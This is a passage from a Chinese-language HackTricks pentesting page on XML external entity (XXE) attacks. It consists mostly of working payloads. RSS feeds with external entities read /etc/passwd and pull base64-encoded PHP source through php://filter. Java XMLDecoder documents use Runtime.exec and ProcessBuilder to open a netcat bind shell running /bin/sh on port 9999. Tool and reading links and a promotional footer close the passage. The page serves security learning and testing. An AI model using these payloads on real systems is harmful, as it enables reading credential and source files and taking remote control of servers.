<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### 读取文件
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### 读取源代码

使用 PHP base64 过滤器
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEE to RCE

XMLDecoder是一个Java类，它根据XML消息创建对象。如果恶意用户可以让应用程序在调用**readObject**方法时使用任意数据，他将立即在服务器上获得代码执行权限。

### 使用Runtime().exec()
```markup
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
</void>
</object>
</java>
```
### ProcessBuilder

### ProcessBuilder
```markup
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
<void method="start" id="process">
</void>
</void>
</java>
```
## 工具

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## 更多资源

[https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\
[https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\
通过使用自己的外部 DTD 从 HTTP 中提取信息: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\
[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\
[https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\
[https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\
[https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\
[https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)

<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

支持 HackTricks 的其他方式:

* 如果您想在 HackTricks 中看到您的 **公司广告** 或 **下载 PDF 版本的 HackTricks**，请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 探索 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注** 我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>
